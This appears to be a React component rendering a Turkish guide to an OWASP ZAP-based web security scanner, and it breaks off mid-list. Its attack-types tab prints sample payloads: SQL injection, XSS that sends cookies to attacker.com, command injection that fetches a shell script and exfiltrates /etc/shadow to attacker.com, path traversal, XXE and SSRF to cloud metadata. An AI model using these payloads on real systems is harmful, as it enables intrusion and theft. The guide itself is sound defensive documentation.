// @ts-nocheck
import React, { useState } from 'react';
import {
  Box,
  Typography,
  Paper,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Card,
  CardContent,
  Chip,
  Divider,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Alert,
  Tab,
  Tabs,
  Grid,
} from '@mui/material';
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';
import SecurityIcon from '@mui/icons-material/Security';
import BugReportIcon from '@mui/icons-material/BugReport';
import CodeIcon from '@mui/icons-material/Code';
import StorageIcon from '@mui/icons-material/Storage';
import HttpIcon from '@mui/icons-material/Http';
import VpnLockIcon from '@mui/icons-material/VpnLock';
import CheckCircleIcon from '@mui/icons-material/CheckCircle';
import WarningIcon from '@mui/icons-material/Warning';
import InfoIcon from '@mui/icons-material/Info';
import RocketLaunchIcon from '@mui/icons-material/RocketLaunch';
import ShieldIcon from '@mui/icons-material/Shield';
import SpeedIcon from '@mui/icons-material/Speed';
import SettingsIcon from '@mui/icons-material/Settings';

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ p: 3 }}>{children}</Box>}
    </div>
  );
}

const ApplicationGuide: React.FC = () => {
  const [tabValue, setTabValue] = useState(0);
  const [expanded, setExpanded] = useState<string | false>('panel1');

  const handleTabChange = (event: React.SyntheticEvent, newValue: number) => {
    setTabValue(newValue);
  };

  const handleAccordionChange = (panel: string) => (event: React.SyntheticEvent, isExpanded: boolean) => {
    setExpanded(isExpanded ? panel : false);
  };

  return (
    <Box sx={{ p: 3 }}>
      {/* Header */}
      <Paper elevation={3} sx={{ p: 4, mb: 3, background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)' }}>
        <Box display="flex" alignItems="center" gap={2} mb={2}>
          <SecurityIcon sx={{ fontSize: 48, color: 'white' }} />
          <Box>
            <Typography variant="h4" sx={{ color: 'white', fontWeight: 'bold' }}>
              🛡️ İBB Güvenlik Platform Kılavuzu
            </Typography>
            <Typography variant="subtitle1" sx={{ color: 'rgba(255,255,255,0.9)' }}>
              Kapsamlı Web Güvenlik Tarama ve Analiz Platformu
            </Typography>
          </Box>
        </Box>
        <Typography variant="body1" sx={{ color: 'rgba(255,255,255,0.95)', mt: 2 }}>
          Bu platform, OWASP ZAP tabanlı gelişmiş güvenlik tarama yetenekleri sunar.
          Web uygulamalarınızı 20+ farklı saldırı türüne karşı test edin ve güvenlik açıklarını tespit edin.
        </Typography>
      </Paper>

      {/* Main Tabs */}
      <Paper elevation={2}>
        <Tabs value={tabValue} onChange={handleTabChange} variant="scrollable" scrollButtons="auto">
          <Tab icon={<RocketLaunchIcon />} label="Hızlı Başlangıç" />
          <Tab icon={<BugReportIcon />} label="Saldırı Türleri" />
          <Tab icon={<SettingsIcon />} label="Tarama Ortamları" />
          <Tab icon={<ShieldIcon />} label="Güvenlik Politikaları" />
          <Tab icon={<SpeedIcon />} label="En İyi Pratikler" />
        </Tabs>

        {/* Tab 1: Hızlı Başlangıç */}
        <TabPanel value={tabValue} index={0}>
          <Typography variant="h5" gutterBottom>
            🚀 Hızlı Başlangıç
          </Typography>
          <Divider sx={{ mb: 3 }} />

          <Alert severity="info" sx={{ mb: 3 }}>
            <strong>3 Adımda Güvenlik Taraması:</strong> Platform kullanımı son derece basittir.
            Ortam seçin, hedef URL girin ve taramayı başlatın!
          </Alert>

          <Grid container spacing={3}>
            <Grid item xs={12} md={4}>
              <Card elevation={3} sx={{ height: '100%' }}>
                <CardContent>
                  <Box display="flex" alignItems="center" gap={1} mb={2}>
                    <Typography variant="h2" sx={{ color: 'primary.main' }}>1</Typography>
                    <Typography variant="h6">Ortam Seçimi</Typography>
                  </Box>
                  <Typography variant="body2" paragraph>
                    Tarama yapacağınız ortamı seçin:
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="🧪 TEST/STAGING"
                        secondary="Kapsamlı test (Maksimum agresiflik)"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="🔒 PRODUCTION"
                        secondary="Güvenli tarama (Sadece okuma)"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="⚙️ CUSTOM"
                        secondary="Özel ayarlar (Detaylı kontrol)"
                      />
                    </ListItem>
                  </List>
                </CardContent>
              </Card>
            </Grid>

            <Grid item xs={12} md={4}>
              <Card elevation={3} sx={{ height: '100%' }}>
                <CardContent>
                  <Box display="flex" alignItems="center" gap={1} mb={2}>
                    <Typography variant="h2" sx={{ color: 'primary.main' }}>2</Typography>
                    <Typography variant="h6">Hedef Belirleme</Typography>
                  </Box>
                  <Typography variant="body2" paragraph>
                    Taranacak web uygulamasını tanımlayın:
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemIcon><HttpIcon color="primary" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="Target URL"
                        secondary="Ana URL'yi girin (https://example.com)"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CodeIcon color="primary" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="Scan Name"
                        secondary="Taramaya özel isim verin (opsiyonel)"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><VpnLockIcon color="primary" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="Context"
                        secondary="Tarama kapsamını belirleyin"
                      />
                    </ListItem>
                  </List>
                </CardContent>
              </Card>
            </Grid>

            <Grid item xs={12} md={4}>
              <Card elevation={3} sx={{ height: '100%' }}>
                <CardContent>
                  <Box display="flex" alignItems="center" gap={1} mb={2}>
                    <Typography variant="h2" sx={{ color: 'primary.main' }}>3</Typography>
                    <Typography variant="h6">Tarama & Rapor</Typography>
                  </Box>
                  <Typography variant="body2" paragraph>
                    Taramayı başlatın ve sonuçları inceleyin:
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemIcon><RocketLaunchIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="Başlat"
                        secondary="Otomatik tarama başlar"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><SpeedIcon color="info" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="İzle"
                        secondary="Gerçek zamanlı ilerleme takibi"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><SecurityIcon color="error" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="Analiz Et"
                        secondary="Detaylı rapor ve öneriler"
                      />
                    </ListItem>
                  </List>
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        </TabPanel>

        {/* Tab 2: Saldırı Türleri */}
        <TabPanel value={tabValue} index={1}>
          <Typography variant="h5" gutterBottom>
            🎯 Desteklenen Saldırı Türleri ve Test Yetenekleri
          </Typography>
          <Divider sx={{ mb: 3 }} />

          <Alert severity="warning" sx={{ mb: 3 }}>
            <strong>Dikkat:</strong> Bu saldırı testleri sadece sahip olduğunuz veya test etme izni olan sistemlerde kullanılmalıdır.
          </Alert>

          {/* SQL Injection */}
          <Accordion expanded={expanded === 'panel1'} onChange={handleAccordionChange('panel1')}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box display="flex" alignItems="center" gap={2} width="100%">
                <StorageIcon color="error" />
                <Typography variant="h6">SQL Injection (SQL Enjeksiyonu)</Typography>
                <Chip label="CRITICAL" color="error" size="small" sx={{ ml: 'auto' }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" paragraph>
                <strong>Açıklama:</strong> Veritabanı sorgularına kötü niyetli SQL kodları enjekte ederek veri tabanına yetkisiz erişim sağlama girişimi.
              </Typography>
              <Typography variant="body2" paragraph>
                <strong>Test Edilen Zafiyetler:</strong>
              </Typography>
              <List dense>
                <ListItem>• Classic SQL Injection (Error-based, Union-based)</ListItem>
                <ListItem>• Blind SQL Injection (Boolean-based, Time-based)</ListItem>
                <ListItem>• Stacked Queries (Multiple SQL commands)</ListItem>
                <ListItem>• Out-of-band SQL Injection</ListItem>
                <ListItem>• Second-order SQL Injection</ListItem>
              </List>
              <Typography variant="body2" paragraph>
                <strong>Örnek Payloadlar:</strong>
              </Typography>
              <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
                ' OR '1'='1<br />
                1' UNION SELECT NULL,NULL,NULL--<br />
                1' AND 1=1 AND '1'='1<br />
                1' WAITFOR DELAY '0:0:5'--<br />
                ' OR 1=1 DROP TABLE users--
              </Paper>
              <Alert severity="info" sx={{ mt: 2 }}>
                Platform, 500+ farklı SQL injection payload ile test yapar.
              </Alert>
            </AccordionDetails>
          </Accordion>

          {/* XSS */}
          <Accordion expanded={expanded === 'panel2'} onChange={handleAccordionChange('panel2')}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box display="flex" alignItems="center" gap={2} width="100%">
                <CodeIcon color="error" />
                <Typography variant="h6">Cross-Site Scripting (XSS)</Typography>
                <Chip label="HIGH" color="error" size="small" sx={{ ml: 'auto' }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" paragraph>
                <strong>Açıklama:</strong> Kullanıcı tarayıcısında kötü amaçlı JavaScript kodu çalıştırarak oturum bilgilerini çalma, kullanıcıyı yönlendirme veya sayfa içeriğini değiştirme.
              </Typography>
              <Typography variant="body2" paragraph>
                <strong>Test Edilen XSS Türleri:</strong>
              </Typography>
              <List dense>
                <ListItem>• Reflected XSS (URL parametreleri üzerinden)</ListItem>
                <ListItem>• Stored XSS (Veritabanında kalıcı)</ListItem>
                <ListItem>• DOM-based XSS (Client-side)</ListItem>
                <ListItem>• Self-XSS (Kullanıcının kendi hesabında)</ListItem>
                <ListItem>• Blind XSS (Admin panellerinde tetiklenen)</ListItem>
              </List>
              <Typography variant="body2" paragraph>
                <strong>Örnek Payloadlar:</strong>
              </Typography>
              <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
                {'<script>alert(document.cookie)</script>'}<br />
                {'<img src=x onerror=alert(1)>'}<br />
                {'<svg onload=alert(1)>'}<br />
                {'<iframe src="javascript:alert(1)">'}<br />
                {'\"><script>fetch(\'https://attacker.com/?c=\'+document.cookie)</script>'}
              </Paper>
              <Alert severity="info" sx={{ mt: 2 }}>
                Platform, 1000+ XSS payload varyasyonu ile test yapar ve WAF bypass teknikleri kullanır.
              </Alert>
            </AccordionDetails>
          </Accordion>

          {/* Command Injection */}
          <Accordion expanded={expanded === 'panel3'} onChange={handleAccordionChange('panel3')}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box display="flex" alignItems="center" gap={2} width="100%">
                <CodeIcon color="error" />
                <Typography variant="h6">Command Injection (Komut Enjeksiyonu)</Typography>
                <Chip label="CRITICAL" color="error" size="small" sx={{ ml: 'auto' }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" paragraph>
                <strong>Açıklama:</strong> Sunucu üzerinde işletim sistemi komutlarını çalıştırarak sisteme tam erişim sağlama.
              </Typography>
              <Typography variant="body2" paragraph>
                <strong>Test Teknikleri:</strong>
              </Typography>
              <List dense>
                <ListItem>• OS Command Injection (Linux/Windows)</ListItem>
                <ListItem>• Command Chaining (; && || | operators)</ListItem>
                <ListItem>• Command Substitution (`command`, $(command))</ListItem>
                <ListItem>• Time-based Blind Command Injection</ListItem>
                <ListItem>• Out-of-band Command Injection</ListItem>
              </List>
              <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
                ; cat /etc/passwd<br />
                | whoami<br />
                && ping -c 10 attacker.com<br />
                `wget http://attacker.com/shell.sh`<br />
                $(curl http://attacker.com/?data=$(cat /etc/shadow))
              </Paper>
            </AccordionDetails>
          </Accordion>

          {/* Path Traversal */}
          <Accordion expanded={expanded === 'panel4'} onChange={handleAccordionChange('panel4')}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box display="flex" alignItems="center" gap={2} width="100%">
                <StorageIcon color="warning" />
                <Typography variant="h6">Path Traversal / Directory Traversal</Typography>
                <Chip label="HIGH" color="warning" size="small" sx={{ ml: 'auto' }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" paragraph>
                <strong>Açıklama:</strong> Dosya yollarını manipüle ederek yetkisiz dosyalara erişim sağlama.
              </Typography>
              <List dense>
                <ListItem>• Local File Inclusion (LFI)</ListItem>
                <ListItem>• Remote File Inclusion (RFI)</ListItem>
                <ListItem>• Absolute Path Traversal</ListItem>
                <ListItem>• Relative Path Traversal</ListItem>
                <ListItem>• Null Byte Injection (%00)</ListItem>
              </List>
              <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
                ../../../etc/passwd<br />
                ....//....//....//etc/passwd<br />
                /etc/passwd<br />
                ..%2F..%2F..%2Fetc%2Fpasswd<br />
                ../../../../../../windows/system32/drivers/etc/hosts
              </Paper>
            </AccordionDetails>
          </Accordion>

          {/* XXE */}
          <Accordion expanded={expanded === 'panel5'} onChange={handleAccordionChange('panel5')}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box display="flex" alignItems="center" gap={2} width="100%">
                <CodeIcon color="error" />
                <Typography variant="h6">XXE (XML External Entity)</Typography>
                <Chip label="HIGH" color="error" size="small" sx={{ ml: 'auto' }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" paragraph>
                <strong>Açıklama:</strong> XML parser'ları manipüle ederek hassas dosyalara erişim, SSRF saldırısı veya DoS gerçekleştirme.
              </Typography>
              <List dense>
                <ListItem>• Classic XXE (File disclosure)</ListItem>
                <ListItem>• Blind XXE (Out-of-band)</ListItem>
                <ListItem>• SSRF via XXE</ListItem>
                <ListItem>• Billion Laughs Attack (DoS)</ListItem>
                <ListItem>• Parameter Entity XXE</ListItem>
              </List>
              <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
                {'<?xml version="1.0"?>'}<br />
                {'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'}<br />
                {'<root>&xxe;</root>'}
              </Paper>
            </AccordionDetails>
          </Accordion>

          {/* CSRF */}
          <Accordion expanded={expanded === 'panel6'} onChange={handleAccordionChange('panel6')}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box display="flex" alignItems="center" gap={2} width="100%">
                <SecurityIcon color="warning" />
                <Typography variant="h6">CSRF (Cross-Site Request Forgery)</Typography>
                <Chip label="MEDIUM" color="warning" size="small" sx={{ ml: 'auto' }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" paragraph>
                <strong>Açıklama:</strong> Kullanıcının bilgisi dışında, kimliği doğrulanmış bir kullanıcı adına istek gönderme.
              </Typography>
              <List dense>
                <ListItem>• GET-based CSRF</ListItem>
                <ListItem>• POST-based CSRF</ListItem>
                <ListItem>• JSON-based CSRF</ListItem>
                <ListItem>• CSRF Token Bypass</ListItem>
                <ListItem>• SameSite Cookie Bypass</ListItem>
              </List>
            </AccordionDetails>
          </Accordion>

          {/* SSRF */}
          <Accordion expanded={expanded === 'panel7'} onChange={handleAccordionChange('panel7')}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box display="flex" alignItems="center" gap={2} width="100%">
                <HttpIcon color="error" />
                <Typography variant="h6">SSRF (Server-Side Request Forgery)</Typography>
                <Chip label="HIGH" color="error" size="small" sx={{ ml: 'auto' }} />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" paragraph>
                <strong>Açıklama:</strong> Sunucuyu manipüle ederek internal ağa veya harici sistemlere istek göndertme.
              </Typography>
              <List dense>
                <ListItem>• Basic SSRF (Internal IP scanning)</ListItem>
                <ListItem>• Blind SSRF (No response feedback)</ListItem>
                <ListItem>• Cloud Metadata SSRF (AWS, Azure, GCP)</ListItem>
                <ListItem>• DNS Rebinding</ListItem>
                <ListItem>• Protocol Smuggling (file://, gopher://, etc.)</ListItem>
              </List>
              <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
                http://localhost:80<br />
                http://127.0.0.1:6379<br />
                http://169.254.169.254/latest/meta-data/<br />
                file:///etc/passwd<br />
                gopher://127.0.0.1:6379/_INFO
              </Paper>
            </AccordionDetails>
          </Accordion>

          {/* Additional Attack Types */}
          <Box mt={3}>
            <Typography variant="h6" gutterBottom>
              Diğer Test Edilen Zafiyet Türleri:
            </Typography>
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Card variant="outlined">
                  <CardContent>
                    <Typography variant="subtitle2" gutterBottom>
                      <WarningIcon fontSize="small" color="warning" /> Brute Force Saldırıları
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Login formları, admin panelleri ve kimlik doğrulama mekanizmalarına karşı otomatik parola deneme.
                    </Typography>
                  </CardContent>
                </Card>
              </Grid>
              <Grid item xs={12} md={6}>
                <Card variant="outlined">
                  <CardContent>
                    <Typography variant="subtitle2" gutterBottom>
                      <WarningIcon fontSize="small" color="warning" /> WAF Bypass Teknikleri
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Web Application Firewall'ları atlatmak için encoding, obfuscation ve alternative payloadlar.
                    </Typography>
                  </CardContent>
                </Card>
              </Grid>
              <Grid item xs={12} md={6}>
                <Card variant="outlined">
                  <CardContent>
                    <Typography variant="subtitle2" gutterBottom>
                      <InfoIcon fontSize="small" color="info" /> Deserialization Attacks
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Serialize edilmiş nesneleri manipüle ederek Remote Code Execution (RCE) sağlama.
                    </Typography>
                  </CardContent>
                </Card>
              </Grid>
              <Grid item xs={12} md={6}>
                <Card variant="outlined">
                  <CardContent>
                    <Typography variant="subtitle2" gutterBottom>
                      <InfoIcon fontSize="small" color="info" /> Buffer Overflow
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Bellek taşması oluşturarak sistem kontrolü ele geçirme denemeleri.
                    </Typography>
                  </CardContent>
                </Card>
              </Grid>
            </Grid>
          </Box>
        </TabPanel>

        {/* Tab 3: Tarama Ortamları */}
        <TabPanel value={tabValue} index={2}>
          <Typography variant="h5" gutterBottom>
            ⚙️ Tarama Ortamları
          </Typography>
          <Divider sx={{ mb: 3 }} />

          <Grid container spacing={3}>
            {/* TEST/STAGING */}
            <Grid item xs={12}>
              <Card elevation={3} sx={{ border: '2px solid #2196f3' }}>
                <CardContent>
                  <Box display="flex" alignItems="center" gap={2} mb={2}>
                    <RocketLaunchIcon sx={{ fontSize: 40, color: '#2196f3' }} />
                    <Box>
                      <Typography variant="h5" sx={{ color: '#2196f3' }}>
                        🧪 TEST / STAGING ORTAMI
                      </Typography>
                      <Chip label="Maksimum Agresiflik" color="error" size="small" />
                    </Box>
                  </Box>

                  <Alert severity="warning" sx={{ mb: 2 }}>
                    <strong>⚠️ UYARI:</strong> Bu mod sadece test ve staging ortamları için kullanılmalıdır!
                    Canlı sistemlerde kullanmayın.
                  </Alert>

                  <Typography variant="body2" paragraph>
                    <strong>Amaç:</strong> Uygulamanızı maksimum güvenlik standartlarında test etmek.
                  </Typography>

                  <Typography variant="subtitle2" gutterBottom>
                    ✅ Aktif Özellikler:
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="Unlimited Spider Crawling"
                        secondary="Sınırsız derinlik ve URL keşfi (maxChildren=0, maxDepth=0)"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="AJAX Spider (Deep Crawling)"
                        secondary="JavaScript tabanlı uygulamalar için 10 seviye derinlik"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="Active Scan - INSANE Mode"
                        secondary="En agresif tarama modu, tüm kurallar aktif"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="20+ Saldırı Türü"
                        secondary="SQL Injection, XSS, Command Injection, CSRF, SSRF, XXE, vb."
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="WAF Bypass & Advanced Payloads"
                        secondary="Firewall atlatma teknikleri ve karmaşık payloadlar"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="Fuzzing & Brute Force"
                        secondary="Otomatik parametre fuzzing ve brute force testleri"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="API Deep Dive & GraphQL Testing"
                        secondary="API endpoint analizi ve GraphQL güvenlik testleri"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="JavaScript Security Analysis"
                        secondary="Client-side güvenlik analizi ve kütüphane taraması"
                      />
                    </ListItem>
                  </List>

                  <Typography variant="subtitle2" gutterBottom sx={{ mt: 2 }}>
                    ⚙️ Teknik Ayarlar:
                  </Typography>
                  <Paper sx={{ p: 2, bgcolor: '#2a2a2a', color: 'white' }}>
                    <Grid container spacing={2}>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Thread Count:</strong> 10 (Maximum)</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Request Delay:</strong> 0ms (No throttling)</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Max Alerts:</strong> Unlimited</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Robots.txt:</strong> Ignored</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Safe Mode:</strong> Disabled</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Scan Duration:</strong> Unlimited</Typography>
                      </Grid>
                    </Grid>
                  </Paper>
                </CardContent>
              </Card>
            </Grid>

            {/* PRODUCTION */}
            <Grid item xs={12}>
              <Card elevation={3} sx={{ border: '2px solid #4caf50' }}>
                <CardContent>
                  <Box display="flex" alignItems="center" gap={2} mb={2}>
                    <ShieldIcon sx={{ fontSize: 40, color: '#4caf50' }} />
                    <Box>
                      <Typography variant="h5" sx={{ color: '#4caf50' }}>
                        🔒 PRODUCTION ORTAMI
                      </Typography>
                      <Chip label="Güvenli Mod - Sadece Okuma" color="success" size="small" />
                    </Box>
                  </Box>

                  <Alert severity="success" sx={{ mb: 2 }}>
                    <strong>✅ GÜVENLİ:</strong> Canlı sistemler için özel olarak tasarlanmıştır.
                    Veri tabanına yazma yapmaz, sadece pasif testler yapar.
                  </Alert>

                  <Typography variant="body2" paragraph>
                    <strong>Amaç:</strong> Canlı uygulamanızı etkilemeden güvenlik kontrolü yapmak.
                  </Typography>

                  <Typography variant="subtitle2" gutterBottom>
                    ✅ Aktif Özellikler:
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="Limited Spider (Safe Crawling)"
                        secondary="Sınırlı derinlik (maxChildren=50, maxDepth=5, 30 min)"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="Passive Scanning Only"
                        secondary="Sadece trafik analizi, saldırı testleri YOK"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="Technology Detection"
                        secondary="Kullanılan teknolojilerin tespiti"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                      <ListItemText
                        primary="JavaScript Library Analysis"
                        secondary="Güvenli JS kütüphane analizi"
                      />
                    </ListItem>
                  </List>

                  <Typography variant="subtitle2" gutterBottom sx={{ mt: 2 }}>
                    ❌ Devre Dışı Özellikler:
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemIcon><WarningIcon color="disabled" /></ListItemIcon>
                      <ListItemText
                        primary="Active Scanning"
                        secondary="Tüm aktif saldırı testleri kapalı"
                        sx={{ textDecoration: 'line-through', opacity: 0.6 }}
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><WarningIcon color="disabled" /></ListItemIcon>
                      <ListItemText
                        primary="Form Submission"
                        secondary="Formlar gönderilmez, sadece analiz edilir"
                        sx={{ textDecoration: 'line-through', opacity: 0.6 }}
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><WarningIcon color="disabled" /></ListItemIcon>
                      <ListItemText
                        primary="Attack Payloads"
                        secondary="Hiçbir saldırı payload'u gönderilmez"
                        sx={{ textDecoration: 'line-through', opacity: 0.6 }}
                      />
                    </ListItem>
                  </List>

                  <Typography variant="subtitle2" gutterBottom sx={{ mt: 2 }}>
                    ⚙️ Teknik Ayarlar:
                  </Typography>
                  <Paper sx={{ p: 2, bgcolor: '#2a2a2a', color: 'white' }}>
                    <Grid container spacing={2}>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Thread Count:</strong> 2 (Low impact)</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Request Delay:</strong> 1000ms (Slow)</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Max Redirects:</strong> 10 (Limited)</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Robots.txt:</strong> Respected</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Safe Mode:</strong> Enabled</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="body2"><strong>Scan Duration:</strong> 30-50 min max</Typography>
                      </Grid>
                    </Grid>
                  </Paper>
                </CardContent>
              </Card>
            </Grid>

            {/* CUSTOM */}
            <Grid item xs={12}>
              <Card elevation={3} sx={{ border: '2px solid #ff9800' }}>
                <CardContent>
                  <Box display="flex" alignItems="center" gap={2} mb={2}>
                    <SettingsIcon sx={{ fontSize: 40, color: '#ff9800' }} />
                    <Box>
                      <Typography variant="h5" sx={{ color: '#ff9800' }}>
                        ⚙️ CUSTOM (ÖZEL AYARLAR)
                      </Typography>
                      <Chip label="Detaylı Kontrol" color="warning" size="small" />
                    </Box>
                  </Box>

                  <Typography variant="body2" paragraph>
                    <strong>Amaç:</strong> Her bir özelliği ayrı ayrı kontrol edebilme esnekliği.
                  </Typography>

                  <Typography variant="subtitle2" gutterBottom>
                    🎛️ Yapılandırılabilir Seçenekler:
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemText
                        primary="Spider Configuration"
                        secondary="maxChildren, maxDepth, maxDuration, recurse ayarları"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemText
                        primary="AJAX Spider Settings"
                        secondary="Browser seçimi, crawl depth, duration kontrolü"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemText
                        primary="Active Scan Intensity"
                        secondary="LOW, MEDIUM, HIGH, INSANE seviyeleri"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemText
                        primary="Individual Attack Tests"
                        secondary="Her saldırı türünü ayrı ayrı aktif/pasif yapma"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemText
                        primary="Advanced Features"
                        secondary="JS Security, API Deep Dive, Fuzzing, Custom Payloads"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemText
                        primary="URL Filters"
                        secondary="Include/Exclude URL patterns, parameter filtering"
                      />
                    </ListItem>
                  </List>

                  <Alert severity="info" sx={{ mt: 2 }}>
                    <strong>💡 İpucu:</strong> Belirli bir zafiyet türünü test etmek istiyorsanız,
                    CUSTOM mode kullanarak sadece o test grubunu aktif edebilirsiniz.
                  </Alert>
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        </TabPanel>

        {/* Tab 4: Güvenlik Politikaları */}
        <TabPanel value={tabValue} index={3}>
          <Typography variant="h5" gutterBottom>
            🛡️ Güvenlik Politikaları ve Compliance
          </Typography>
          <Divider sx={{ mb: 3 }} />

          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Card>
                <CardContent>
                  <Typography variant="h6" gutterBottom color="primary">
                    OWASP Top 10 Coverage
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A01:2021 – Broken Access Control" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A02:2021 – Cryptographic Failures" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A03:2021 – Injection" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
